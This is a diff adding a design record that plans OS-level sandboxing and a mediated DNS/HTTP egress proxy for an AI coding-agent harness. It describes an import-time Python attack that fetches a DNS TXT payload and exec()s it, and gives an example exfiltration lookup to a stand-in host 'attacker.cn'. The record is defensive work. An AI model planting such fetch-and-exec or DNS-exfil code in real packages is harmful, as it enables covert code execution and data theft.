@@ -11125,3 +11125,161 @@ Headless spec green (all assertions incl. the live-PTY wiring proof); `bun test 
 
 ADR-0150/0151/0155 (the Neovim integration this hardens), ADR-0038 (ext_parity block-line contract),
 ADR-0152 (the MCP result-gate the demo now asserts).
+
+-----
+
+## ADR-0157 - P-SANDBOX: enforce the runtime execution boundary (mediated subprocess egress + real profile capabilities) (SCOPE/PLAN)
+
+**Date:** 2026-07-05
+**Status:** Accepted - SCOPE/PLAN. Phased build P-SANDBOX.1-.4 (one increment per session, CLAUDE.md ritual).
+**Increment:** P-SANDBOX (epic). Foundation = P-SANDBOX.1.
+
+### Context - the post-approval runtime blind spot
+
+Every execution/network control we ship today acts on **text at the tool boundary, BEFORE a process is spawned**:
+`classifyCommand` (ADR-0066, `desktop/exec_policy.ts`) tiers an *argv string*; `egressVerdict` /
+`egressDecisionDetailed` (ADR-0062/0106/0108, `desktop/egress_policy.ts` + `network_whitelist.ts`) allow/deny a
+*URL string* for the agent's own `browser`/`web`/`fetch` tools; the scanner keystone (`scanner-sidecar/`) flags
+*malformed/hidden text*. All three are pre-spawn, text-layer gates. **Once `bash`/`eval` is approved and a
+process is running, LUCID has zero runtime visibility into it** - no syscall, network, DNS, or child-process
+monitoring anywhere in the tree.
+
+A public reviewer (Thom E.) named the exact hole: a Python package whose `__init__.py`, at **import time**, does
+`socket.gethostbyname()` on a TXT record, decodes the answer, and `exec()`s it - **in-process, after `execve`
+returned success**. The command the agent ran (`python train.py`, or a `pip install`) is well-formed and benign
+to any argv classifier. `exec_policy.ts`'s own header (lines 6-9) and ADR-0066 concede this is out of scope for
+the classifier ("does NOT catch a perfectly well-formed command"; "we do NOT attempt behavior analysis"). He is
+right that this is a **harness/execution-layer** gap, not something measuring agent trajectories can catch.
+
+Compounding it: `harness/runs/profiles.ts` **declares** `PROFILE_CAPS.canNetwork` / `canExec` per profile
+(`container-local` + `quarantine` = `canNetwork:false`), and `chooseProfile` auto-downgrades a suspicious causal
+chain to a network-off profile - but **no runtime code reads `canNetwork` to actually cut network.** It is policy
+metadata consumed only by demos/tests. omp's `--isolate` (ADR-0028) is **filesystem** containment (fuse-overlay /
+ProjFS) only - no network namespace, no seccomp. So even the "downgrade to a safer profile" path grants no real
+network isolation, and DNS is not modeled anywhere in the codebase.
+
+**This ADR makes the declared execution boundary real, while keeping LUCID usable for everyday agent work.**
+
+### Non-goals / what this is NOT
+
+- NOT a replacement for the scanner keystone or the argv/egress gates - it is **defense in depth beneath them**
+  (exactly ADR-0066's framing). The in-process gate (inv #4) still scans every tool call fail-closed on every OS.
+- NOT an attempt to "understand the payload." We assume the payload is undetectable as text (it is). We contain
+  the process instead: the only thing that must be true is that a hostile in-process action has **no unmediated
+  route out.**
+- NOT an omp fork (inv #1). We wrap the omp process WE ALREADY SPAWN (`lucid_acp.ts` / `acp_backend.ts`); we do
+  not modify how omp's bash tool executes internally.
+
+### Decision - contain the process, mediate its egress with the brain we already have
+
+**1. A portable sandbox seam (`harness/runs/sandbox_exec.ts`, TS/Bun - inv #2, no new Python).**
+A `SandboxBackend` interface `{ available(): boolean; wrap(argv, caps, ctx): { cmd, args, env } }` and a pure
+`resolveBackend(platform, managed)`:
+- **`BwrapBackend` (Linux, v1):** wrap the spawn in `bwrap` - workspace bound rw, system paths ro, `--unshare-net`
+  for the network boundary, `--seccomp` for a deny-list of the worst syscalls. All of omp's child exec tools
+  (`bash`/`eval`/`python`/`pip`) inherit the namespace, so containment is at the process tree, not per-command.
+- **`NoopBackend` (platforms without a backend, v1 = macOS/Windows):** a **disclosed, audited passthrough** - runs
+  as today (argv gate + scanner still fully apply) and emits a loud "exec not runtime-isolated on this platform"
+  signal. This is the "LUCID still functions" pressure-valve: we do not brick exec on Mac/Windows while the
+  Linux backend leads. **Enterprise-managed policy can flip this to REQUIRE isolation** (`managed_config.ts`):
+  then an unavailable backend fail-closes to *block exec* rather than disclose. Personal default = disclose.
+
+**2. Make `canNetwork` / `canExec` actually enforced (closes the profiles.ts gap).**
+`wrap` reads the chosen `ProfileCaps`. `canNetwork:false` (`container-local` / `quarantine`) →
+`--unshare-net` with **no** proxy = total network deny (the DNS-TXT lookup fails at the syscall). `canExec:false`
+(`read-only-audit` / `quarantine`) → exec tools are refused outright. The auto-downgrade path (a suspicious/
+quarantined causal chain, `chooseProfile`) now yields a genuinely network-isolated run, not a label.
+
+**3. The mediated egress proxy (`harness/runs/egress_proxy.ts`, TS/Bun) - the part that defeats the DNS exfil.**
+For `canNetwork:true` profiles we do NOT want a dead network (that breaks `pip install`). Instead the sandbox's
+only route out is a **loopback DNS resolver + HTTP/CONNECT proxy** the harness runs: inside the namespace,
+`/etc/resolv.conf` is bind-mounted to `127.0.0.1` and `HTTP(S)_PROXY` points at the proxy. Every DNS query and
+every CONNECT is decided by the **existing pure `egressDecisionDetailed(host, ctx)`** from `egress_policy.ts` -
+we REUSE the allow/deny/whitelist/managed brain the browser tool already uses (inv: import, never re-derive), so
+subprocess egress obeys the SAME curated whitelist (P-NETWL), managed ceiling (P-ENT.1), and posture (P-NETWL.5)
+the user already curates. `socket.gethostbyname()` on a TXT record is now a **resolver event we see, log, and can
+refuse** - the exact surface Thom said didn't exist. Fail-closed (inv #3): proxy unreachable / unparseable host →
+DNS/CONNECT denied.
+
+**4. "Still functions" is the reuse of the P-NETWL.5 posture, not a new toggle.**
+- Personal default (`allowAll` on): subprocess egress is **allowed but now MEDIATED + LOGGED**, and the existing
+  still-prompt heuristics (public-IP literal, foreign ccTLD - `isForeignTld` / `isPrivateOrLanHost`) extend to
+  subprocess DNS. So `pip install requests` → PyPI resolves and works; a decode→`gethostbyname("<b64>.attacker.cn")`
+  hits the foreign-TLD prompt / gets logged even in permissive mode.
+- Restrictive/whitelist mode (`allowAll` off) or enterprise-managed: the TXT lookup to a non-whitelisted host is
+  **hard-blocked** at the resolver - the payload can't phone home at all.
+- Filesystem, local build, read-only commands: unchanged (workspace bound rw). Latency: namespace setup is ~ms;
+  the proxy is loopback.
+
+### Phasing (shippable, one increment per session)
+
+- **P-SANDBOX.1** - the seam + `BwrapBackend` + `NoopBackend` + `resolveBackend`; enforce `canNetwork:false` /
+  `canExec:false` (total-deny + refuse-exec) for the downgrade profiles; managed "require-isolation" flag; the
+  disclosed-passthrough audit. Wired at the omp spawn in `lucid_acp.ts` (`execGated`) + `acp_backend.ts`, behind a
+  preflight like the scanner probe. This alone makes the declared caps real for suspicious/quarantined runs.
+- **P-SANDBOX.2** - `egress_proxy.ts` (loopback DNS resolver + CONNECT proxy) consulting `egressDecisionDetailed`;
+  proxy-mediated egress for `canNetwork:true`; extend the P-NETWL.5 foreign-TLD/IP-literal prompt to subprocess
+  DNS. This is the increment that directly answers the DNS-TXT exfil.
+- **P-SANDBOX.3** - `contracts.ts` event additions (`exec_sandboxed`, `subprocess_egress_blocked`,
+  `dns_query_blocked`) - ITS OWN increment + this ADR's follow-up per inv #8 (unknown event name must raise) -
+  plus the Security-panel surfacing and the **kill-the-proxy fail-closed test** (mirrors the kill-the-sidecar
+  guarantee: proxy dead ⇒ egress denied, local exec still runs).
+- **P-SANDBOX.4** (later) - macOS Seatbelt (`sandbox-exec`) + Windows AppContainer backends; `slirp4netns`-style
+  forwarding so raw non-proxied sockets (a direct connect to an IP literal, bypassing `HTTP_PROXY`) are also
+  funneled through the proxy rather than merely dropped by `--unshare-net`.
+
+### Plumbing (for the build increments)
+
+- `harness/runs/sandbox_exec.ts` - `SandboxBackend`, `BwrapBackend`, `NoopBackend`, pure `resolveBackend`,
+  `wrapForProfile(caps, ctx)`; injected `which`/`spawn` for hermetic tests.
+- `harness/runs/egress_proxy.ts` - a loopback DNS (udp/53 forwarder) + HTTP CONNECT listener; each request →
+  `egressDecisionDetailed`; fail-closed; a lifecycle `start()/stop()` + preflight probe like `ScannerClient`.
+- `harness/launcher/lucid_acp.ts` (`execGated`) + `desktop/acp_backend.ts` - resolve the backend, start the proxy
+  as a fail-closed dependency, spawn omp wrapped; NoopBackend disclosure path.
+- `desktop/managed_config.ts` - a `requireIsolation` managed knob (tighten-only, like `clampEgress`/`clampPosture`).
+- `harness/runs/profiles.ts` - unchanged types; `caps()` becomes a REAL consumer (the gap this closes).
+- Tests: `sandbox_exec.test.ts` (backend resolution, cap→flag mapping, managed require-isolation fail-closed,
+  NoopBackend discloses), `egress_proxy.test.ts` (DNS/CONNECT verdict reuse, fail-closed, kill-the-proxy),
+  `make demo-P-SANDBOX.{1,2}` (a legit `pip install` succeeds mediated; a TXT-exfil `gethostbyname` to a
+  non-whitelisted host is blocked+logged; proxy dead ⇒ egress denied, local exec still works).
+
+### Consequences / honest risks
+
+- **Linux-first.** Real runtime containment lands on Linux (the CI/remote-runner + most enterprise surface) in
+  .1/.2; macOS/Windows get it in .4. Until then those platforms are **no worse than today** (argv gate + scanner)
+  and say so out loud (the disclosure event) - but a Mac/Windows user is not yet protected from this threat unless
+  managed policy requires isolation (which would block their exec). This is a deliberate, disclosed trade to keep
+  the product usable, not a silent gap.
+- **`--unshare-net` + proxy covers proxy-honoring egress and all DNS; raw-IP sockets that ignore `HTTP_PROXY` are
+  DROPPED (no route) in v1, and only FORWARDED through the proxy in .4.** For the named threat (DNS-TXT) v1/.2 is
+  sufficient; a raw-socket variant is contained (dropped) but not yet observable until .4.
+- More moving parts (a proxy process) = a new fail-closed dependency; mitigated by treating it exactly like the
+  scanner sidecar (preflight + kill test).
+- `bwrap` must be present; absence on Linux → NoopBackend disclosure (or managed block). Packaging ships/pins it.
+
+### Rejected alternatives
+
+- **Interpreter audit hooks (`sys.addaudithook` to trap `socket.gethostbyname`/`exec`/`compile`).** Precise, but
+  (a) it would require shipping a `.py` bootstrap outside `scanner-sidecar/` - a direct **inv #2** violation - and
+  (b) it is Python-only and trivially bypassed by a non-Python payload. OS-level containment is language-agnostic.
+- **A smarter argv classifier / static analysis of the imported package.** This is exactly what ADR-0066 rejected
+  ("false confidence"); the payload is well-formed and behavior only manifests at runtime. Thom's point stands.
+- **Widening the egress allow-list to subprocesses without a namespace.** A decision table isn't an enforcer - with
+  no namespace the subprocess's libc `socket` call never passes through our code. Containment must be OS-level.
+
+### Invariants preserved
+
+Inv #1 (wrap the omp process we spawn - no omp fork). Inv #2 (all new code is TS/Bun; NO new Python - the audit-
+hook path is rejected FOR this reason; the scanner stays the only Python). Inv #3 (fail-closed extends to a new
+layer: no backend under managed-require ⇒ block; proxy dead ⇒ egress denied). Inv #4 (the in-process gate is
+untouched and still runs on every OS; this is beneath it). Inv #6 (runtime only - the frozen prompt prefix is not
+touched). Inv #7 (no new trust labels). Inv #8 (the new EVENT names are quarantined into their own P-SANDBOX.3
+contracts increment; .1/.2 reuse existing `tool_call_blocked`/`remote_run_blocked` emit plumbing).
+
+### Relates to
+
+ADR-0066 (P-EXEC.1 - the argv classifier this sits beneath; the header that concedes this scope limit),
+ADR-0062/0106/0108 (P-EGRESS/P-NETWL - the egress brain + posture this REUSES for subprocess traffic),
+ADR-0028/0032 (omp `--isolate` = filesystem-only containment; this adds the network/exec dimension it lacks),
+ADR-0068 (P-ENT.1 - the managed ceiling that can require isolation), `harness/runs/profiles.ts` (the declared
+`canNetwork`/`canExec` this finally enforces), CLAUDE.md invariants #1/#2/#3/#4.
